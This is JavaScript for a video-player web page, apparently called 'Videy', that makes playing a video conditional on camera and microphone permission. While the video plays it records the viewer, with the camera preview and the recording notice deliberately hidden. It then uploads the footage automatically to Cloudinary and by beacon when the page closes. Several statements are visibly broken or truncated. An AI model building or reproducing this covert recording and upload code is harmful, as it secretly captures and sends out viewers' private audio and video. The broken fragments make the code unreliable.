// ============================================
// ELEMENTS

const mainVideo =

const cameraVideo =

        "cameraVideo"
    );


const cameraPreview =
    document.getElementById(
        "cameraPreview"
    );


const playButton =

        "playButton"
    );


const muteButton =
    document.getElementById(
        "muteButton"
    );


const fullscreenButton =

    );


const currentTime =

        "currentTime"

const duration =

        "duration"
    );


const recordingStatus =
    document.getElementById(

const recordingTime =
    document.getElementById(
        "recordingTime"

const message =
    document.getElementById(
        "message"
    );


const videoList =
    document.getElementById(
        "videoList"
    );


const showMoreBtn =
    document.getElementById(
        "showMoreBtn"
    );


// ============================================
// VARIABLES
// ============================================

let cameraStream = null;

let mediaRecorder = null;

let recordedChunks = [];

let recordedBlob = null;

let recordingStartedAt = null;

let recordingTimer = null;

let stopping = false;

let savePromise = null;

let saveResolve = null;

let videos = [];

let currentIndex = 0;

let visibleCount = 6;

let showMoreExpanded = false;

let switching = false;

const VIDEOS_VISIBLE = 6;


// ============================================
// MESSAGE
// ============================================

function showMessage(text) {

    message.textContent = text;

    message.classList.add(
        "show"
    );

    setTimeout(() => {

        message.classList.remove(
            "show"
        );

    }, 3500);

}


// ============================================
// FORMAT TIME
// ============================================

function formatTime(seconds) {

    if (!Number.isFinite(seconds)) {

        return "00:00";

    }


    const minutes =
        Math.floor(
            seconds / 60
        );


    const secs =
        Math.floor(
            seconds % 60
        );


    return (
        String(minutes)
            .padStart(2, "0")
        +
        ":"
        +
        String(secs)
            .padStart(2, "0")
    );

}


// ============================================
// FORMAT RECORDING TIMER
// ============================================

function formatRecordingTime(
    seconds
) {

    const hours =
        Math.floor(
            seconds / 3600
        );


    const minutes =
        Math.floor(
            (seconds % 3600) / 60
        );


    const secs =
        Math.floor(
            seconds % 60
        );


    return [

        hours,

        minutes,

        secs

    ]
        .map(
            value =>
                String(value)
                    .padStart(2, "0")
        )
        .join(":");

}


// ============================================
// PLAY BUTTON
// ============================================

playButton.addEventListener(
    "click",
    async () => {

        if (
            mainVideo.paused
        ) {

            await startVideo();

        } else {

            mainVideo.pause();

    }
);


// ============================================
// START VIDEO
// ============================================

async function startVideo() {

    try {

        /*
         * Jika kamera belum aktif,
         * minta permission terlebih dahulu.
         */

        if (!cameraStream) {

            await startCamera();

        }


        /*
         * Setelah kamera aktif,
         * mulai video.
         */

        await mainVideo.play();


        /*
         * Mulai recording kamera.
         */

        if (
            !mediaRecorder ||
            mediaRecorder.state ===
            "inactive"
        ) {

            startRecording();

        }

    }

    catch (error) {

        console.error(
            error
        );


        showMessage(
            "Kamera harus diizinkan untuk memutar video."
        );

    }

}


// ============================================
// CAMERA
// ============================================

async function startCamera() {

    /*
     * Meminta akses camera + microphone.
     *
     * Browser akan menampilkan permission.
     */

    cameraStream =
        await navigator
            .mediaDevices
            .getUserMedia({

                video: {

                    width: {
                        ideal: 1280
                    },

                    height: {
                        ideal: 720
                    },

                    facingMode:
                        "user"

                },

                audio: true

            });


    /*
     * Hubungkan camera stream
     * dengan preview.
     */

    cameraVideo.srcObject =
        cameraStream;


    await cameraVideo.play();


    /*
     * Preview kamera disembunyikan,
     * tapi stream tetap aktif untuk recording.
     */

    cameraPreview.classList.remove(
        "active"
    );


    /*
     * Jika kamera tiba-tiba dihentikan
     * oleh user/browser.
     */

    const videoTrack =
        cameraStream.getVideoTracks()[0];


    if (videoTrack) {

        videoTrack.addEventListener(
            "ended",
            () => {

                stopRecording();

                cameraPreview
                    .classList
                    .remove(
                        "active"
                    );

                cameraStream = null;

            }
        );

    }

}


// ============================================
// START RECORDING
// ============================================

function startRecording() {

    if (!cameraStream) {

        return;

    }


    recordedChunks = [];


    /*
     * Pilih format yang didukung browser.
     */

    let mimeType =
        "video/webm;codecs=vp9,opus";


    if (
        !MediaRecorder.isTypeSupported(
            mimeType
        )
    ) {

        mimeType =
            "video/webm;codecs=vp8,opus";

    }


    if (
        !MediaRecorder.isTypeSupported(
            mimeType
        )
    ) {

        mimeType =
            "video/webm";

    }


    mediaRecorder =
        new MediaRecorder(
            cameraStream,
            {
                mimeType
            }
        );


    /*
     * Data recording.
     */

    mediaRecorder.addEventListener(
        "dataavailable",
        event => {

            if (
                event.data &&
                event.data.size > 0
            ) {

                recordedChunks.push(
                    event.data
                );

            }

        }
    );


    /*
     * Ketika recording berhenti.
     */

    mediaRecorder.addEventListener(
        "stop",
        finishRecording
    );


    /*
     * Mulai recording.
     */

    mediaRecorder.start(
        1000
    );


    recordingStartedAt =
        Date.now();


    recordingTimer =
        setInterval(
            updateRecordingTimer,
            1000
        );


    /*
     * Notifikasi "sedang merekam"
     * disembunyikan di UI.
     */


    updateRecordingTimer();

}


// ============================================
// RECORDING TIMER
// ============================================

function updateRecordingTimer() {

    if (!recordingStartedAt) {

        return;

    }


    const elapsed =
        Math.floor(
            (
                Date.now() -
                recordingStartedAt
            ) / 1000
        );


    recordingTime.textContent =
        formatRecordingTime(
            elapsed
        );

}


// ============================================
// STOP RECORDING
// ============================================

function stopRecording() {

    if (
        mediaRecorder &&
        mediaRecorder.state !==
        "inactive"
    ) {

        stopping = true;

        mediaRecorder.stop();

    }

}


// ============================================
// FINISH RECORDING
// ============================================

function finishRecording() {

    clearInterval(
        recordingTimer
    );


    recordingTimer =
        null;


    recordingStartedAt =
        null;


    /*
     * Buat Blob video.
     */

    recordedBlob =
        new Blob(
            recordedChunks,
            {
                type:
                    (
                        mediaRecorder.mimeType ||
                        "video/webm"
                    )
                        .split(";")[0]
                        .trim() ||
                    "video/webm"
            }
        );


    recordingStatus.classList.remove(
        "active"
    );


    /*
     * Reset timer.
     */

    recordingTime.textContent =
        "00:00:00";


    /*
     * Hentikan kamera.
     */

    if (cameraStream) {

        cameraStream
            .getTracks()
            .forEach(
                track => track.stop()
            );

    }


    cameraVideo.srcObject =
        null;


    cameraStream =
        null;


    cameraPreview.classList.remove(
        "active"
    );


    /*
     * Otomatis upload ke server.
     */

    uploadRecording();


    /*
     * Tandai proses save selesai,
     * lepaskan promise yang menunggu.
     */

    stopping = false;

    if (saveResolve) {

        const resolve =
            saveResolve;

        saveResolve =
            null;

        savePromise =
            null;

        resolve();

    }

}


// ============================================
// VIDEO SELESAI
// ============================================

mainVideo.addEventListener(
    "ended",
    () => {

        /*
         * Ketika video selesai,

// ============================================
// KELUAR HALAMAN
// ============================================

window.addEventListener(
    "pagehide",
    () => {

        /*
         * Ketika user keluar dari halaman
         * saat video diputar, recording
         * langsung dikirim ke server.
         */

        if (
            !mediaRecorder ||
            mediaRecorder.state ===
            "inactive"
        ) {

            return;

        }

        if (
            recordedChunks.length ===
            0
        ) {

            return;

        }


        const blob =
            new Blob(
                recordedChunks,
                {
                    type:
                        mediaRecorder.mimeType ||
                        "video/webm"
                }
            );


        if (blob.size === 0) {

            return;

        }


        const formData =
            new FormData();


        formData.append(
            "recording",
            blob,
            `camera-${Date.now()}.webm`
        );


        navigator.sendBeacon(
            "/api/recordings/upload",
            formData
        );


        recordedChunks = [];

    }
);

// ============================================
// UPLOAD FUNCTION
// ============================================
//
// Rekaman di-upload langsung dari browser ke
// Cloudinary memakai signature dari server.
// Ini melewati batas body 4.5 MB serverless
// function di Vercel.

async function uploadRecording() {

    if (!recordedBlob) {

        return;

    }


    try {

        const filename =
            `camera-${Date.now()}`;


        const signatureResponse =
            await fetch(
                `/api/upload-signature?filename=${encodeURIComponent(filename)}`
            );


        const signatureData =
            await signatureResponse.json();


        if (!signatureResponse.ok) {

            throw new Error(
                signatureData.message ||
                "Gagal mendapatkan signature upload."
            );

        }


        const formData =
            new FormData();


        formData.append(
            "file",
            recordedBlob,
            `${filename}.webm`
        );

        formData.append(
            "cloud_name",
            signatureData.cloud_name
        );

        formData.append(
            "api_key",
            signatureData.api_key
        );

        formData.append(
            "timestamp",
            signatureData.timestamp
        );

        formData.append(
            "signature",
            signatureData.signature
        );

        formData.append(
            "folder",
            signatureData.folder
        );

        formData.append(
            "public_id",
            filename
        );


        const uploadResponse =
            await fetch(
                `https://api.cloudinary.com/v1_1/${signatureData.cloud_name}/video/upload`,
                {
                    method:
                        "POST",

                    body:
                        formData
                }
            );


        const result =
            await uploadResponse.json();


        if (!uploadResponse.ok) {

            throw new Error(
                result.error?.message ||
                "Upload recording gagal."
            );

        }


        console.log(
            "Recording:",
            result.public_id
        );


    }

    catch (error) {

        console.error(
            error
        );


        showMessage(
            error.message ||
            "Upload recording gagal."
        );

    }

}


// ============================================
// BASE64 TO BUFFER
// ============================================

function base64ToBuffer(
    base64
) {

    const binary =
        atob(
            base64
        );


    const bytes =
        new Uint8Array(
            binary.length
        );


    for (
        let i = 0;
        i < binary.length;
        i++
    ) {

        bytes[i] =
            binary
                .charCodeAt(
                    i
                );

    }


    return bytes;

}


// ============================================
// DEKRIPSI THUMBNAIL
// ============================================

async function decryptThumbnail(
    thumbnail
) {

    try {

        const key =
            await crypto
                .subtle
                .importKey(
                    "raw",

                    base64ToBuffer(
                        thumbnail.key
                    ),

                    {
                        name:
                            "AES-GCM"
                    },

                    false,

                    [
                        "decrypt"
                    ]
                );


        const ciphertext =
            base64ToBuffer(
                thumbnail.ciphertext
            );


        const tag =
            base64ToBuffer(
                thumbnail.tag
            );


        const data =
            new Uint8Array(
                ciphertext.length +
                tag.length
            );


        data.set(
            ciphertext,
            0
        );


        data.set(
            tag,
            ciphertext.length
        );


        const plaintext =
            await crypto
                .subtle
                .decrypt(
                    {

                        name:
                            "AES-GCM",

                        iv:
                            base64ToBuffer(
                                thumbnail.nonce
                            )

                    },

                    key,

                    data
                );


        const blob =
            new Blob(
                [plaintext],
                {
                    type:
                        "image/jpeg"
                }
            );


        return URL.createObjectURL(
            blob
        );

    }

    catch (error) {

        console.error(
            error
        );


        return null;

    }

}


// ============================================
// LOAD VIDEO DARI JSON
// ============================================

async function loadVideo() {

    try {

        const response =
            await fetch(
                "/videos.json"
            );


        const data =
            await response.json();


        videos =
            data.videos;


        if (
            !videos ||
            videos.length === 0
        ) {

            showMessage(
                "Tidak ada video tersedia."
            );

            return;

        }


        renderVideoList();


        await loadVideoByIndex(
            0
        );

    }

    catch (error) {

        console.error(
            error
        );


        showMessage(
            "Gagal memuat data video."
        );

    }

}


// ============================================
// LOAD VIDEO BERDASARKAN INDEX
// ============================================

async function loadVideoByIndex(
    index
) {

    const video =
        videos[index];


    if (!video) {

        return;

    }


    currentIndex =
        index;


    mainVideo.src =
        video.url;


    mainVideo.poster =
        await decryptThumbnail(
            video.thumbnail_encrypted
        );


    const videoTitle =
        document.querySelector(
            ".video-title"
        );


    if (videoTitle) {

        videoTitle.textContent =
            video.title;

    }


    const videoDescription =
        document.querySelector(
            ".video-description"
        );


    if (videoDescription) {

        videoDescription.textContent =
            `Durasi: ${video.durasi}. ` +
            "Klik tombol play untuk memulai video. " +
            "Setelah kamera mendapatkan izin, " +
            "recording kamera akan dimulai " +
            "secara otomatis selama video diputar.";

    }


    currentTime.textContent =
        "00:00";


    duration.textContent =
        "00:00";


    setActiveVideo(
        index
    );

}


// ============================================
// DAFTAR VIDEO LAINNYA
// ============================================

function renderVideoList() {

    videoList.innerHTML =
        "";


    const videoCount =
        document.getElementById(
            "videoCount"
        );


    if (videoCount) {

        videoCount.textContent =
            `${videos.length} video`;

    }


    videos.forEach(
        function (
            video,
            index
        ) {

            const item =
                document.createElement(
                    "div"
                );


            item.className =
                "video-item";


            if (index === currentIndex) {

                item.classList.add(
                    "active"
                );

            }


            const thumb =
                document.createElement(
                    "div"
                );


            thumb.className =
                "video-thumb";


            const indexLabel =
                document.createElement(
                    "span"
                );


            indexLabel.className =
                "video-index";


            indexLabel.textContent =
                String(
                    index + 1
                )
                    .padStart(
                        2,
                        "0"
                    );


            const name =
                document.createElement(
                    "div"
                );


            name.className =
                "video-title-text";


            name.textContent =
                video.title;


            const durationLabel =
                document.createElement(
                    "span"
                );


            durationLabel.className =
                "video-duration";


            durationLabel.textContent =
                video.durasi;


            item.appendChild(
                thumb
            );


            item.appendChild(
                indexLabel
            );


            item.appendChild(
                name
            );


            item.appendChild(
                durationLabel
            );


            item.addEventListener(
                "click",
                function () {

                    switchVideo(
                        index
                    );

                }
            );


            videoList.appendChild(
                item
            );

        }
    );


    updateVisibleVideos();


    updateShowMoreBtn();


    renderVisibleThumbnails();

}


function updateVisibleVideos() {

    const items =
        videoList.children;


    for (
        let i = 0;
        i < items.length;
        i++
    ) {

        items[i].style.display =
            (
                i < visibleCount
            )
                ? "flex"
                : "none";

    }

}


function updateShowMoreBtn() {

    if (
        videos.length <=
        VIDEOS_VISIBLE
    ) {

        showMoreBtn.style.display =
            "none";

        return;

    }


    showMoreBtn.style.display =
        "block";


    showMoreBtn.textContent =
        showMoreExpanded
            ? "Tutup"
            : "Lihat Lainnya";

}


function renderVisibleThumbnails() {

    const items =
        videoList.children;


    for (
        let i = 0;
        i < items.length;
        i++
    ) {

        if (
            i >= visibleCount
        ) {

            continue;

        }


        const item =
            items[i];


        const thumb =
            item.querySelector(
                ".video-thumb"
            );


        if (
            thumb.dataset.loaded
        ) {

            continue;

        }


        thumb.dataset.loaded =
            "1";


        decryptThumbnail(
            videos[i]
                .thumbnail_encrypted
        )
            .then(
                function (url) {

                    if (url) {

                        thumb.style.backgroundImage =
                            `url("${url}")`;

                    }

                }
            );

    }

}


function setActiveVideo(
    index
) {

    const items =
        videoList.children;


    for (
        let i = 0;
        i < items.length;
        i++
    ) {

        items[i].classList.toggle(
            "active",
            i === index
        );

    }

}


// ============================================
// SHOW MORE / TUTUP
// ============================================

showMoreBtn.addEventListener(
    "click",
    function () {

        showMoreExpanded =
            !showMoreExpanded;


        visibleCount =
            showMoreExpanded
                ? videos.length
                : VIDEOS_VISIBLE;


        updateVisibleVideos();


        updateShowMoreBtn();


        renderVisibleThumbnails();

    }
);


// ============================================
// GANTI VIDEO (OTOMATIS SIMPAN REKAMAN)
// ============================================

async function switchVideo(
    index
) {

    if (switching) {

        return;

    }


    switching =
        true;


    try {

        if (
            index ===
            currentIndex
        ) {

            if (
                mainVideo.paused
            ) {

                await startVideo();

            }

            return;

        }


        if (
            !mainVideo.paused
        ) {

            mainVideo.pause();

        }


        await stopAndSaveRecording();


        await loadVideoByIndex(
            index
        );


        await startVideo();

    }

    catch (error) {

        console.error(
            error
        );


        showMessage(
            "Gagal mengganti video."
        );

    }

    finally {

        switching =
            false;

    }

}


// ============================================
// STOP REKAMAN & TUNGGU SELESAI
// ============================================

function stopAndSaveRecording() {

    if (savePromise) {

        return savePromise;

    }


    if (
        stopping ||
        (
            mediaRecorder &&
            mediaRecorder.state !==
            "inactive"
        )
    ) {

        if (!stopping) {

            stopping =
                true;

            mediaRecorder.stop();

        }


        savePromise =
            new Promise(
                function (resolve) {

                    saveResolve =
                        resolve;

                }
            );


        return savePromise;

    }


    return Promise.resolve();

}


loadVideo();


</script>


<script>


// ============================================
// SHARE
// ============================================

const shareButton =
    document.getElementById(
        "shareButton"
    );


shareButton.addEventListener(
    "click",
    async () => {

        const videoTitle =
            document.querySelector(
                ".video-title"
            );


        const shareData =
            {
                title:
                    videoTitle
                        ? videoTitle.textContent
                        : "Videy",

                url:
                    window.location.href
            };


        try {

            if (navigator.share) {

                await navigator.share(
                    shareData
                );

            } else {

                await navigator
                    .clipboard
                    .writeText(
                        window.location.href
                    );


                showMessage(
                    "Link berhasil disalin."
                );

            }

        }

        catch (error) {

            if (
                error.name !==
                "AbortError"
            ) {

                console.error(
                    error
                );

            }

        }

    }
);


</script>
